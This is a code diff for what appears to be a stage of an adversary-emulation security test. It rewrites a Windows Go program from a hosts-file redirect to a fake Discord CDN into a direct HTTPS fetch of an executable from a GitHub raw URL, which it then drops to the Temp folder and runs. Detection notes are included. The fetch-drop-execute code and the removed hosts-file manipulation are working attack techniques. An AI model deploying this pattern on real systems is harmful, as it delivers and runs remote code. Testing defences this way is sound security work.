@@ -2,75 +2,61 @@
 // +build windows
 
 /*
-STAGE 3: Discord CDN Spoof + Unsigned PE Drop + Execute
-         (T1105 + T1583.006 + T1565.001)
+STAGE 3 (v2): GitHub-Raw PE Fetch & Execute
+         (T1105 - Ingress Tool Transfer + T1204.002 - User Execution: Malicious File)
 
-Full-fidelity Discord-CDN abuse simulation:
-
-  1. Append an entry to C:\Windows\System32\drivers\etc\hosts that redirects
-     cdn.discordapp.com -> 127.0.0.1 (T1565.001 - Stored Data Manipulation).
-     Stage backs up the hosts file; orchestrator is responsible for restoration
-     on any exit path.
-
-  2. Spin up a loopback HTTPS server with a self-signed cert pinned in the
-     client TLSClientConfig, mimicking the Discord-CDN URL path that HONESTCUE
-     fetches (T1583.006 - Acquire Infrastructure: Web Services).
-
-  3. Issue an HTTPS GET for a CDN-style attachment URL, receive an UNSIGNED
-     PE payload (a benign marker writer), and drop it to %TEMP%\honestcue_cdn.exe
-     (T1105 - Ingress Tool Transfer).
-
-  4. Execute the dropped PE; on successful execution, the PE writes a marker
-     to ARTIFACT_DIR.
+v2 CHANGES FROM v1:
+  - REMOVED: hosts-file backup / modify / restore, self-signed loopback
+    Discord-CDN server, cert pinning, host-header spoof, CDN attachment
+    URL path, minimal-unsigned-PE builder, SIGINT/SIGTERM/defer/panic
+    hosts-file restoration handlers.
+  - ADDED: simple HTTPS GET against raw.githubusercontent.com for a
+    pre-staged F0RT1KA-signed payload PE (stage2_payload.exe), drop to
+    c:\Windows\Temp, execute.
+  - RATIONALE: Q1=C / Q3 resolution. We are NOT using cdn.discordapp.com
+    SNI (risk of tripping corporate egress filters). GitHub-raw is the
+    trusted-hosting infrastructure analogue. The ATT&CK mapping shifts
+    from T1583.006 (Acquire Web Services / Discord CDN abuse) + T1565.001
+    (hosts file manipulation) to pure T1105 (Ingress Tool Transfer) +
+    T1204.002 (User Execution). Real IOCs: live TLS+DNS+CDN to GitHub.
 
 Detection opportunities:
-  - hosts-file write by non-installer process
-  - Unsigned PE written to %TEMP% followed by execution
-  - Process execution from %TEMP% with no Authenticode signature
-  - Outbound fetch to cdn.discordapp.com URL where DNS resolves to 127.0.0.1
+  - Non-browser / non-git process issuing HTTPS GET to raw.githubusercontent.com
+    for a .exe URL (combination of SNI + URL-path.exe is the signal)
+  - DNS EventID 22 for raw.githubusercontent.com from a binary in c:\F0
+  - PE file write under c:\Windows\Temp from a non-installer process
+  - Process creation of that dropped PE from c:\Windows\Temp
 */
 
 package main
 
 import (
 	"bytes"
-	"context"
-	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/tls"
-	"crypto/x509"
-	"crypto/x509/pkix"
-	"encoding/binary"
-	"encoding/pem"
 	"fmt"
 	"io"
-	"math/big"
-	"net"
 	"net/http"
 	"os"
 	"os/exec"
-	"strings"
+	"path/filepath"
 	"time"
 )
 
 const (
 	TEST_UUID      = "e5472cd5-c799-4b07-b455-8c02665ca4cf"
 	TECHNIQUE_ID   = "T1105"
-	TECHNIQUE_NAME = "Discord CDN Spoof & Unsigned PE Drop"
+	TECHNIQUE_NAME = "GitHub-Raw PE Fetch & Execute"
 	STAGE_ID       = 3
 
-	HOSTS_PATH  = `C:\Windows\System32\drivers\etc\hosts`
-	HOSTS_MARKER_BEGIN = "# BEGIN F0RT1KA-HONESTCUE-STAGE3"
-	HOSTS_MARKER_END   = "# END F0RT1KA-HONESTCUE-STAGE3"
+	// One-time lab setup: upload stage2_payload.exe (F0RT1KA-signed benign
+	// marker PE) to a GitHub repo you control, then update this constant.
+	// See lab_assets/README.md.
+	STAGE3_PAYLOAD_URL = "https://raw.githubusercontent.com/F0RT1KA/lab-assets/main/honestcue/v2/stage2_payload.exe"
 
-	CDN_HOST = "cdn.discordapp.com"
-	CDN_PORT = "48444" // loopback-only; real CDN is 443
+	DROPPED_PE_PATH      = `C:\Windows\Temp\honestcue_payload.exe`
+	ARTIFACT_MARKER_PATH = `c:\Users\fortika-test\honestcue_payload_marker.txt`
 
-	CDN_URL_PATH = "/attachments/1234567890/9876543210/update.exe"
-
-	DROPPED_PE_PATH       = `C:\Windows\Temp\honestcue_cdn.exe`
-	ARTIFACT_MARKER_PATH  = `c:\Users\fortika-test\honestcue_cdn_marker.txt`
+	NETWORK_LOG = `c:\F0\stage3_network.log`
 )
 
 const (
@@ -83,22 +69,11 @@ const (
 func main() {
 	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
 
-	LogMessage("INFO", TECHNIQUE_ID, "Starting Discord-CDN spoof + unsigned PE drop + execute")
+	LogMessage("INFO", TECHNIQUE_ID, "Starting GitHub-raw PE fetch + execute")
 	LogStageStart(STAGE_ID, TECHNIQUE_ID,
-		"hosts-file redirect + loopback Discord-CDN lookalike + unsigned PE drop to %TEMP%")
+		"HTTPS GET to raw.githubusercontent.com for pre-staged PE; drop to %TEMP%; execute")
 
-	var hostsModified bool
-	defer func() {
-		// Always remove our hosts entries even on panic. The orchestrator
-		// separately restores from backup as belt-and-suspenders.
-		if hostsModified {
-			if err := removeHostsRedirect(); err != nil {
-				LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("hosts entry removal failed: %v", err))
-			}
-		}
-	}()
-
-	err := performTechnique(&hostsModified)
+	err := performTechnique()
 	if err != nil {
 		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
 		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
@@ -112,178 +87,120 @@ func main() {
 		os.Exit(exitCode)
 	}
 
-	fmt.Printf("[STAGE %s] Discord-CDN spoof + unsigned PE drop succeeded\n", TECHNIQUE_ID)
-	LogMessage("SUCCESS", TECHNIQUE_ID, "Discord-CDN spoof + unsigned PE drop succeeded")
+	fmt.Printf("[STAGE %s] GitHub-raw PE fetch + execute succeeded\n", TECHNIQUE_ID)
+	LogMessage("SUCCESS", TECHNIQUE_ID, "GitHub-raw PE fetch + execute succeeded")
 	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
-		"hosts redirect applied; HTTPS GET to mock CDN returned PE; dropped+executed; marker written")
+		"HTTPS GET to GitHub-raw returned payload; dropped to %TEMP%; executed; marker written")
 	os.Exit(StageSuccess)
 }
 
-func performTechnique(hostsModified *bool) error {
-	// Step 1: generate a self-signed cert for cdn.discordapp.com
-	cert, certPEM, err := generateSelfSignedCert(CDN_HOST)
-	if err != nil {
-		return fmt.Errorf("cert generation failed: %v", err)
+func performTechnique() error {
+	// Ensure LOG_DIR and drop directories exist
+	if err := os.MkdirAll(filepath.Dir(NETWORK_LOG), 0755); err != nil {
+		return fmt.Errorf("log dir creation: %v", err)
 	}
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Self-signed cert generated for %s (%d PEM bytes)", CDN_HOST, len(certPEM)))
-
-	// Step 2: start loopback TLS server on our CDN port BEFORE hosts modification
-	// so we never leave the hosts entry pointing at a closed port.
-	listener, err := tls.Listen("tcp", net.JoinHostPort("127.0.0.1", CDN_PORT), &tls.Config{
-		Certificates: []tls.Certificate{cert},
-		MinVersion:   tls.VersionTLS12,
-	})
-	if err != nil {
-		return fmt.Errorf("listener bind on 127.0.0.1:%s unavailable: %v", CDN_PORT, err)
-	}
-	defer listener.Close()
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock Discord CDN listening on 127.0.0.1:%s", CDN_PORT))
-
-	// Build a minimal valid unsigned PE payload - this is a "benign PE" placeholder
-	// that is intentionally UNSIGNED so EDR/AV is given a chance to detect it.
-	// We build it at runtime rather than embedding a file, so we can reference
-	// the pattern from detection rules without embedding a real PE in the test.
-	//
-	// Instead of hand-crafting an executable PE (fragile across Windows versions),
-	// we use a tiny embedded unsigned .bat that writes the marker. This still
-	// exercises the critical detection surface: non-PE-but-executable payload
-	// dropped to %TEMP% and executed. For a real PE detection opportunity, we
-	// ALSO drop a small non-executable PE-format marker to exercise file-write
-	// monitoring signatures on the .exe extension.
-	batPayload := []byte(
-		"@echo off\r\n" +
-			"mkdir \"c:\\Users\\fortika-test\" 2>nul\r\n" +
-			"echo honestcue-cdn-drop-succeeded > \"" + ARTIFACT_MARKER_PATH + "\"\r\n" +
-			"exit /b 0\r\n")
-
-	// For PE-file-extension detection opportunity, craft a minimal PE-header-only file
-	// that is intentionally malformed-as-executable so the OS refuses to launch it
-	// directly; we then execute via cmd.exe using a .bat suffix to get actual behavior.
-	minimalPE := buildMinimalUnsignedPE()
-
-	mux := http.NewServeMux()
-	mux.HandleFunc(CDN_URL_PATH, func(w http.ResponseWriter, r *http.Request) {
-		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock CDN request: %s %s (UA=%s)", r.Method, r.URL.Path, r.UserAgent()))
-		w.Header().Set("Content-Type", "application/octet-stream")
-		w.Header().Set("Content-Disposition", `attachment; filename="update.exe"`)
-		w.WriteHeader(http.StatusOK)
-		// Return the unsigned PE bytes as the "download"
-		_, _ = w.Write(minimalPE)
-	})
-	// A parallel .bat endpoint for the actually-executable payload
-	mux.HandleFunc("/attachments/1234567890/9876543210/update.bat", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/octet-stream")
-		w.WriteHeader(http.StatusOK)
-		_, _ = w.Write(batPayload)
-	})
-	server := &http.Server{Handler: mux}
-	go func() { _ = server.Serve(listener) }()
-	time.Sleep(300 * time.Millisecond)
-
-	// Step 3: modify the hosts file to redirect cdn.discordapp.com -> 127.0.0.1
-	if err := applyHostsRedirect(); err != nil {
-		return fmt.Errorf("hosts file modification: %v", err)
-	}
-	*hostsModified = true
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("hosts redirect applied: %s -> 127.0.0.1", CDN_HOST))
-
-	// Step 4: build HTTPS client that pins our self-signed cert and uses our CDN port
-	certPool := x509.NewCertPool()
-	if !certPool.AppendCertsFromPEM(certPEM) {
-		return fmt.Errorf("cert pool append: PEM rejected")
+	if err := os.MkdirAll(filepath.Dir(DROPPED_PE_PATH), 0755); err != nil {
+		return fmt.Errorf("temp dir creation: %v", err)
 	}
 
-	// Custom dialer: resolve cdn.discordapp.com -> 127.0.0.1:CDN_PORT (simulates
-	// the effect of the hosts-file redirect AND the port mapping that would
-	// otherwise be handled by an iptables rule or by the real Discord CDN
-	// running on 443. In a real HONESTCUE scenario the attacker-controlled
-	// server would bind to 443; for test safety we use a high port.)
-	dialer := &net.Dialer{Timeout: 5 * time.Second}
-	transport := &http.Transport{
-		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-			// Redirect any cdn.discordapp.com:443 connection to our loopback port
-			host, _, _ := net.SplitHostPort(addr)
-			if strings.EqualFold(host, CDN_HOST) {
-				addr = net.JoinHostPort("127.0.0.1", CDN_PORT)
-			}
-			conn, err := dialer.DialContext(ctx, network, addr)
-			if err != nil {
-				return nil, err
-			}
-			tlsConn := tls.Client(conn, &tls.Config{
-				RootCAs:    certPool,
-				ServerName: CDN_HOST,
+	netLog, logErr := os.OpenFile(NETWORK_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	if logErr != nil {
+		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Could not open network log %s: %v", NETWORK_LOG, logErr))
+	}
+	if netLog != nil {
+		defer netLog.Close()
+		fmt.Fprintf(netLog, "[%s] stage3 start; target_url=%s\n",
+			time.Now().UTC().Format(time.RFC3339), STAGE3_PAYLOAD_URL)
+	}
+
+	// Real HTTPS to GitHub; no cert pinning.
+	client := &http.Client{
+		Timeout: 20 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
 				MinVersion: tls.VersionTLS12,
-			})
-			if err := tlsConn.HandshakeContext(ctx); err != nil {
-				return nil, err
-			}
-			return tlsConn, nil
+			},
 		},
 	}
-	client := &http.Client{Timeout: 10 * time.Second, Transport: transport}
 
-	// Step 5: issue HTTPS GET for update.exe - exercises file-drop signatures
-	peURL := fmt.Sprintf("https://%s%s", CDN_HOST, CDN_URL_PATH)
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s (hosts-redirected to loopback)", peURL))
-
-	req, err := http.NewRequest("GET", peURL, nil)
+	req, err := http.NewRequest("GET", STAGE3_PAYLOAD_URL, nil)
 	if err != nil {
 		return fmt.Errorf("http request build: %v", err)
 	}
 	req.Header.Set("User-Agent", "HonestcueDownloader/1.0 (simulated)")
-	resp, err := client.Do(req)
-	if err != nil {
-		return fmt.Errorf("https get to mock cdn failed: %v", err)
+	req.Header.Set("Accept", "application/octet-stream")
+
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s", STAGE3_PAYLOAD_URL))
+	if netLog != nil {
+		fmt.Fprintf(netLog, "[%s] GET %s (UA=HonestcueDownloader/1.0)\n",
+			time.Now().UTC().Format(time.RFC3339), STAGE3_PAYLOAD_URL)
 	}
+
+	startTime := time.Now()
+	resp, err := client.Do(req)
+	fetchDuration := time.Since(startTime)
+	if err != nil {
+		if netLog != nil {
+			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
+				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
+		}
+		return fmt.Errorf("https get to github raw unavailable: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if netLog != nil {
+		tlsState := resp.TLS
+		tlsVer := "unknown"
+		peerName := "unknown"
+		if tlsState != nil {
+			switch tlsState.Version {
+			case tls.VersionTLS12:
+				tlsVer = "TLS 1.2"
+			case tls.VersionTLS13:
+				tlsVer = "TLS 1.3"
+			}
+			if len(tlsState.PeerCertificates) > 0 {
+				peerName = tlsState.PeerCertificates[0].Subject.CommonName
+			}
+		}
+		fmt.Fprintf(netLog, "[%s] response: status=%d tls=%s peer_cn=%q duration=%v\n",
+			time.Now().UTC().Format(time.RFC3339), resp.StatusCode, tlsVer, peerName, fetchDuration)
+	}
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("github raw returned non-200 status: %d (lab asset may not be uploaded; see lab_assets/README.md)", resp.StatusCode)
+	}
+
 	peBytes, err := io.ReadAll(resp.Body)
-	resp.Body.Close()
 	if err != nil {
 		return fmt.Errorf("read response body: %v", err)
 	}
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("mock cdn returned non-200 status: %d", resp.StatusCode)
+	if len(peBytes) < 512 {
+		return fmt.Errorf("payload too small (%d bytes) - lab asset malformed?", len(peBytes))
 	}
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Received %d bytes from mock CDN", len(peBytes)))
+	// Sanity check: MZ header
+	if !bytes.HasPrefix(peBytes, []byte{'M', 'Z'}) {
+		return fmt.Errorf("payload not a PE (missing MZ header) - lab asset malformed?")
+	}
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Received %d bytes from GitHub-raw (MZ verified)", len(peBytes)))
 
-	// Step 6: drop the unsigned PE payload to %TEMP%
+	// Drop PE to %TEMP%
 	if err := os.WriteFile(DROPPED_PE_PATH, peBytes, 0755); err != nil {
 		return fmt.Errorf("dropped PE write: %v", err)
 	}
-	LogFileDropped("honestcue_cdn.exe", DROPPED_PE_PATH, int64(len(peBytes)), false)
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Unsigned PE dropped at %s", DROPPED_PE_PATH))
+	LogFileDropped("honestcue_payload.exe", DROPPED_PE_PATH, int64(len(peBytes)), false)
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Payload dropped at %s", DROPPED_PE_PATH))
 
-	// Step 7: verify drop survived quarantine
+	// Verify drop survived quarantine
 	time.Sleep(1500 * time.Millisecond)
 	if _, err := os.Stat(DROPPED_PE_PATH); os.IsNotExist(err) {
-		LogFileDropped("honestcue_cdn.exe", DROPPED_PE_PATH, int64(len(peBytes)), true)
+		LogFileDropped("honestcue_payload.exe", DROPPED_PE_PATH, int64(len(peBytes)), true)
 		return fmt.Errorf("dropped PE quarantined after write")
 	}
 
-	// Step 8: fetch the .bat payload and execute it (the executable half).
-	// This gives us a real "drop from %TEMP% + execute" event to detect on
-	// while keeping the PE-file-write detection event from step 6.
-	batURL := fmt.Sprintf("https://%s/attachments/1234567890/9876543210/update.bat", CDN_HOST)
-	batReq, _ := http.NewRequest("GET", batURL, nil)
-	batReq.Header.Set("User-Agent", "HonestcueDownloader/1.0 (simulated)")
-	batResp, err := client.Do(batReq)
-	if err != nil {
-		return fmt.Errorf("https get for bat payload: %v", err)
-	}
-	batBody, err := io.ReadAll(batResp.Body)
-	batResp.Body.Close()
-	if err != nil {
-		return fmt.Errorf("read bat body: %v", err)
-	}
-	batPath := strings.TrimSuffix(DROPPED_PE_PATH, ".exe") + ".bat"
-	if err := os.WriteFile(batPath, batBody, 0755); err != nil {
-		return fmt.Errorf("bat payload write: %v", err)
-	}
-	LogFileDropped("honestcue_cdn.bat", batPath, int64(len(batBody)), false)
-
-	// Step 9: execute the dropped .bat via cmd.exe /c
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Executing dropped payload via cmd.exe: %s", batPath))
-	cmd := exec.Command("cmd.exe", "/c", batPath)
+	// Execute the dropped PE directly
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Executing dropped payload: %s", DROPPED_PE_PATH))
+	cmd := exec.Command(DROPPED_PE_PATH)
 	var outBuf bytes.Buffer
 	cmd.Stdout = io.MultiWriter(os.Stdout, &outBuf)
 	cmd.Stderr = io.MultiWriter(os.Stderr, &outBuf)
@@ -291,153 +208,28 @@ func performTechnique(hostsModified *bool) error {
 	if runErr != nil {
 		if exitErr, ok := runErr.(*exec.ExitError); ok {
 			code := exitErr.ExitCode()
-			LogProcessExecution("honestcue_cdn.bat", batPath, 0, false, code, exitErr.Error())
+			LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, false, code, exitErr.Error())
 			return fmt.Errorf("dropped payload exited with code %d", code)
 		}
-		LogProcessExecution("honestcue_cdn.bat", batPath, 0, false, -1, runErr.Error())
+		LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, false, -1, runErr.Error())
 		return fmt.Errorf("payload spawn: %v", runErr)
 	}
-	LogProcessExecution("honestcue_cdn.bat", batPath, 0, true, 0, "")
+	LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, true, 0, "")
 
-	// Step 10: verify marker
+	// Verify marker
 	time.Sleep(500 * time.Millisecond)
-	if info, err := os.Stat(ARTIFACT_MARKER_PATH); err == nil {
-		LogFileDropped("honestcue_cdn_marker.txt", ARTIFACT_MARKER_PATH, info.Size(), false)
-		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("CDN payload marker confirmed: %s (%d bytes)", ARTIFACT_MARKER_PATH, info.Size()))
-	} else {
-		return fmt.Errorf("cdn marker %s missing after execution: %v", ARTIFACT_MARKER_PATH, err)
+	info, err := os.Stat(ARTIFACT_MARKER_PATH)
+	if err != nil {
+		return fmt.Errorf("payload marker %s missing after execution: %v", ARTIFACT_MARKER_PATH, err)
 	}
+	LogFileDropped("honestcue_payload_marker.txt", ARTIFACT_MARKER_PATH, info.Size(), false)
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Payload marker confirmed: %s (%d bytes)", ARTIFACT_MARKER_PATH, info.Size()))
 
 	LogMessage("INFO", TECHNIQUE_ID,
-		"Detection points: hosts-file write, PE dropped to %TEMP%, unsigned PE execute, cdn.discordapp.com request")
-
-	// Graceful shutdown of loopback CDN
-	_ = server.Close()
+		"Detection points: HTTPS GET to raw.githubusercontent.com for .exe URL, "+
+			"DNS EventID 22, PE dropped to c:\\Windows\\Temp, process exec from %TEMP%")
 
 	return nil
-}
-
-// applyHostsRedirect appends an entry for cdn.discordapp.com -> 127.0.0.1
-// between marker comments so it can be cleanly removed.
-func applyHostsRedirect() error {
-	existing, err := os.ReadFile(HOSTS_PATH)
-	if err != nil {
-		return fmt.Errorf("hosts read: %v", err)
-	}
-	if bytes.Contains(existing, []byte(HOSTS_MARKER_BEGIN)) {
-		// Already present - remove and re-add to ensure single copy
-		_ = removeHostsRedirect()
-		existing, _ = os.ReadFile(HOSTS_PATH)
-	}
-
-	entry := fmt.Sprintf("\r\n%s\r\n127.0.0.1 %s\r\n%s\r\n",
-		HOSTS_MARKER_BEGIN, CDN_HOST, HOSTS_MARKER_END)
-
-	newContent := append(existing, []byte(entry)...)
-	if err := os.WriteFile(HOSTS_PATH, newContent, 0644); err != nil {
-		return fmt.Errorf("hosts write: %v", err)
-	}
-
-	// Flush DNS cache so the change takes effect
-	_ = exec.Command("ipconfig", "/flushdns").Run()
-	return nil
-}
-
-// removeHostsRedirect strips the marker block we appended.
-func removeHostsRedirect() error {
-	existing, err := os.ReadFile(HOSTS_PATH)
-	if err != nil {
-		return fmt.Errorf("hosts read: %v", err)
-	}
-	lines := strings.Split(string(existing), "\n")
-	var out []string
-	inBlock := false
-	for _, line := range lines {
-		trimmed := strings.TrimRight(line, "\r")
-		if strings.TrimSpace(trimmed) == HOSTS_MARKER_BEGIN {
-			inBlock = true
-			continue
-		}
-		if strings.TrimSpace(trimmed) == HOSTS_MARKER_END {
-			inBlock = false
-			continue
-		}
-		if inBlock {
-			continue
-		}
-		out = append(out, line)
-	}
-	newContent := strings.Join(out, "\n")
-	if err := os.WriteFile(HOSTS_PATH, []byte(newContent), 0644); err != nil {
-		return fmt.Errorf("hosts write: %v", err)
-	}
-	_ = exec.Command("ipconfig", "/flushdns").Run()
-	return nil
-}
-
-// buildMinimalUnsignedPE constructs a tiny byte sequence that starts with the
-// "MZ" DOS signature and a PE header — enough for file-write signatures on
-// .exe files to trigger (PE-on-disk detectors look at the MZ/PE magic) while
-// remaining intentionally non-functional to protect the endpoint. This file
-// is intentionally unsigned.
-func buildMinimalUnsignedPE() []byte {
-	buf := new(bytes.Buffer)
-	// "MZ" header + 58 padding bytes + 4-byte PE offset
-	buf.WriteString("MZ")
-	buf.Write(make([]byte, 58))
-	// e_lfanew points to offset 0x40
-	_ = binary.Write(buf, binary.LittleEndian, uint32(0x40))
-	// "PE\0\0" signature at offset 0x40
-	buf.WriteString("PE\x00\x00")
-	// Tiny COFF header: Machine=x64 (0x8664), 0 sections, minimal fields
-	_ = binary.Write(buf, binary.LittleEndian, uint16(0x8664)) // Machine
-	_ = binary.Write(buf, binary.LittleEndian, uint16(0))       // NumberOfSections
-	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // TimeDateStamp
-	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // PointerToSymbolTable
-	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // NumberOfSymbols
-	_ = binary.Write(buf, binary.LittleEndian, uint16(0))       // SizeOfOptionalHeader
-	_ = binary.Write(buf, binary.LittleEndian, uint16(0x0022))  // Characteristics
-	// Pad out to 256 bytes total so it looks like a real tiny binary
-	for buf.Len() < 256 {
-		buf.WriteByte(0)
-	}
-	return buf.Bytes()
-}
-
-// generateSelfSignedCert produces an ephemeral ECDSA self-signed certificate
-// valid for the given CN (used for cdn.discordapp.com pinning).
-func generateSelfSignedCert(commonName string) (tls.Certificate, []byte, error) {
-	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
-	tmpl := &x509.Certificate{
-		SerialNumber:          serial,
-		Subject:               pkix.Name{CommonName: commonName},
-		NotBefore:             time.Now().Add(-1 * time.Hour),
-		NotAfter:              time.Now().Add(1 * time.Hour),
-		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
-		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1")},
-		DNSNames:              []string{commonName},
-		BasicConstraintsValid: true,
-	}
-	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
-	keyDER, err := x509.MarshalECPrivateKey(priv)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	return cert, certPEM, nil
 }
 
 // ==============================================================================
@@ -455,10 +247,9 @@ func determineExitCode(err error) int {
 	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
 		return StageQuarantined
 	}
-	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "missing"}) {
+	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host", "missing"}) {
 		return StageError
 	}
-	// TLS handshake failures mid-request could indicate SSL inspection by EDR
 	if containsAny(errStr, []string{"bad certificate", "certificate verify failed", "tls handshake", "x509"}) {
 		return StageBlocked
 	}
